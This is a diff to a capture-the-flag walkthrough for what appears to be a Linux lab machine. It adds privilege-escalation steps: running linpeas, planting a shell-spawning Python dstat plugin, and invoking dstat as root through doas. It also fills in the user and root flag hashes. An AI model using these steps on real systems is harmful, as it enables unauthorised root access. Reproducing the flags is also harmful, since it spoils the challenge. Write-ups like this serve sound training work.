@@ -154,10 +154,53 @@ The user will have the user flag.
 
 Navgivate to the tmp directory and download *linpeas* and then run the linpeas script and wait until the user and system have been enumerated for vulnerabilities.
 
+We find through the linpeas output that there is a utility program called *doas* that allows a user account to run a command as another user account.
+
+Create a new python file with the name *dstat_[anything you want].py*
+Inside the script paste the following which creates a shell:
+*import os\
+os.system("sh")\*
+
+Now use the following command to find the directiories with the name dstat.
+
+**Command:** *find / type -d -name dstat 2>/dev/null*
+
+**Command Description:**\
+* / : Look for all files/directories
+*  type -d : Look for directories
+*  -name : The name you looking for
+*  2>/dev/null : Redirects errors to /dev/null instead of showing them on screen
+
+**Results:**\
+4 directories are displayed, */usr/local/share/dstat* is the one we are interested in.
+
+Copy the previously created python script from its location to the dstat directory location */usr/local/share/dstat* using *cp* 
+
+**Command:** *cp dstat_privesc.py /usr/local/share/dstat*
+
+Then run the following command to list the dstat files using the following command.
+
+**Command:** *dstat --list*
+
+**Results:**\
+On the bottom of the displayed results, the relevant result is returned which is the name that was given to the python script after *dstat_*. (In my case under the /usr/local/share/dstat results it displayed *privesc*).
+
+This confirms that dstat recognizes the python script.
+
+## Running the Vulnerable Service (doas)
+
+Type the following command (remember to insert the name of the script that was recieved from running the command dstat --list, in my case it is *privesc*) to get root and then navigate to the root directory to recieve the root flag.
+
+**Command:** *doas -u root /usr/bin/dstat --privesc*
+
+**Results:**\
+BOOM, YOU ARE ROOT!
+
+
 # Goals
 
 * USER Flag: 73a57d7e814d39476159dbcb83f6694c
-* ROOT Flag:
+* ROOT Flag: c18e4872b8b0c59662cda8244f73c90d
 
 
 
